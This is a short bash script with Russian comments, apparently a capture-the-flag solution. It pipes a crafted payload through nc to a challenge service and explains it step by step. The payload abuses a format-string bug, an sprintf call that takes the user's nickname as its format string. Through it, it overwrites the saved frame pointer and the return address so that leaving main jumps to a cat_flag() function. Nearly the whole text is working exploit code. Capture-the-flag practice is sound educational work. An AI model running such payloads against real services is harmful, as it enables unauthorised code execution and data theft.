#!/bin/bash
python -c "print('AAAA\nAAAA\nset_nickname\n%64xBBBBBBBB\x5d\x0b\x40\x00\nexit\n')" | nc service port

# Разбора пэйлоада:
    # AAAA\nAAAA\n      -> пропускаем "Login"
    # set_nickname\n    -> вызываем меню с установлением нового nickname
    # %64xBBBBBBBB\x5d\x0b\x40\x00\n  -> offset(64) + RBP(8) + cat_flag_ptr(4)
    # exit\n            -> тригерим выход из main для возврата на cat_flag()
# Уязвимость:
    # sprintf(acc->nickname, ~nickname_shadow~);    <- забыли форматную строку! 
    # теперь nickname_shadow выступает в роли форматной строки!!! 